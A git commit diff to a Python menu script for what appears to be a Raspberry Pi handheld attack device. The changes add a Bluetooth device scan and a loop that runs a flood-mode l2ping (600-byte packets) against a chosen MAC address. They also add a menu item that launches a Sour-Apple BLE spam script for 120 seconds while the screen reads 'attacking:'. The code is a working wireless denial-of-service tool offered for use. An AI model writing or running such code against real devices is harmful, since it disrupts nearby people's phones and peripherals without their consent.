7ab2d4704c18c86a5fed4bff72a82a00a87f3285
Alex . <vitrivalexander@gmail.com>
2025-03-23 17:59:06 +0200

    update code

--- menugui.py
+++ menugui.py
@@ -5,6 +5,7 @@ import RPi.GPIO as GPIO
 import subprocess
 import signal
 import os
+import bluetooth
 
 # GPIO кнопок
 BUTTON_UP = 21
@@ -39,7 +40,7 @@ draw = ImageDraw.Draw(img)
 font = ImageFont.load_default()
 
 
-files_image = ["imgmenu/fbcp.png", "imgmenu/hackfm.png", "imgmenu/hping.png", "imgmenu/rpi433.png", "imgmenu/rpi433.png", "imgmenu/sourapple.png"]
+files_image = ["imgmenu/fbcp.png", "imgmenu/hackfm.png", "imgmenu/l2ping.png", "imgmenu/rpi433.png", "imgmenu/sourapple.png"]
 images = [Image.open(x).convert("RGB").resize((128, 128)) for x in files_image]
 current_index = 0
 
@@ -47,15 +48,27 @@ def draw_image():
     
     disp.display(images[current_index])
 draw_image()
-
-
-
 fm_opt = ["select freq", "select wav", "start attack"] 
 cursor = 0
+
+def scan_bluetooth_devices():
+    nearby_devices = bluetooth.discover_devices(duration=8, flush_cache=True)
+    mac_addresses = []  
+    if len(nearby_devices) == 0:
+        print("Не знайдено пристроїв.")
+    if len(nearby_devices) > 0:
+        print(f"Знайдено {len(nearby_devices)} пристроїв:")
+        for addr in nearby_devices:
+            mac_addresses.append(addr)
+
+    return mac_addresses
+
+
+
 while True:
     if GPIO.input(BUTTON_UP) == GPIO.LOW:
         time.sleep(0.2)  
-        current_index = (current_index - 1) % len(images)
+        current_index = (current_index + 1) % len(images)
         draw_image()
     if GPIO.input(BUTTON_DOWN) == GPIO.LOW:
         time.sleep(0.2)  
@@ -197,13 +210,72 @@ while True:
 
 
         if current_index == 2:
-            draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
-            disp.display(img)
-            draw.text((50, 50), "hping3", font=font, fill="white")
-            disp.display(img)
-            time.sleep(2)
+            mac_addresses = scan_bluetooth_devices()
+            cursor = 0
+            while True:
+                draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
+                y = 20
+                for i, addr in enumerate(mac_addresses):
+                    if i == cursor:
+                        draw.text((29, y), f"> {addr}", font=font, fill="white")
+                    else:
+                        draw.text((29, y), f"  {addr}", font=font, fill="white")
+                    y += 20
+                disp.display(img)
+                button_state_UP = GPIO.input(BUTTON_UP)
+                button_state_DOWN = GPIO.input(BUTTON_DOWN)
+                button_state_SELECT = GPIO.input(BUTTON_SELECT)
+                if button_state_UP == GPIO.LOW:
+                    cursor = (cursor - 1) % len(mac_addresses)
+                    time.sleep(0.1)
+                if button_state_DOWN == GPIO.LOW:
+                    cursor = (cursor + 1) % len(mac_addresses)
+                    time.sleep(0.1)
+
+                if button_state_SELECT == GPIO.LOW:
+                    selected_mac = mac_addresses[cursor]
+                    
+                    
+                    command = ["timeout", "1", "sudo", "l2ping", "-s", "600", "-f", selected_mac]
+                    print(f"l2ping {selected_mac}")               
+                    # subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) 
+                     
+                        
+                        
+                        
+                    # Вивести статус на екран
+                    draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
+                    draw.text((29, 20), f"l2ping {selected_mac}", fill="white")
+                    for i in range(10):
+                        subprocess.run(command)
+                        draw.rectangle((40, 30, 160, 50), outline="black", fill="black")
+                        draw.text((40, 30), f"at {i+1}", fill="white")
+                        disp.display(img)
+                     
+
+                    time.sleep(1)
+                    draw_image()
+                    break
+            time.sleep(0.1)
             draw_image()
 
+  
+
         if current_index == 3:
-           draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
-           disp.display(img)
+            None
+
+        if current_index == 4:
+            
+            command = ['sudo', 'python', '/home/alex/Sour-Apple/sourapple.py']
+            subprocess.Popen(command)            
+            draw.rectangle((0, 0, 160, 128), outline="black", fill="black")
+            draw.text((40, 20), f"attacking:", fill="white")
+            for i in range(120):
+                time.sleep(1)
+                draw.rectangle((40, 30, 160, 50), outline="black", fill="black")
+                draw.text((40, 30), f"at {i+1}", fill="white")
+                 
+                disp.display(img)          
+
+            time.sleep(1)
+            draw_image()
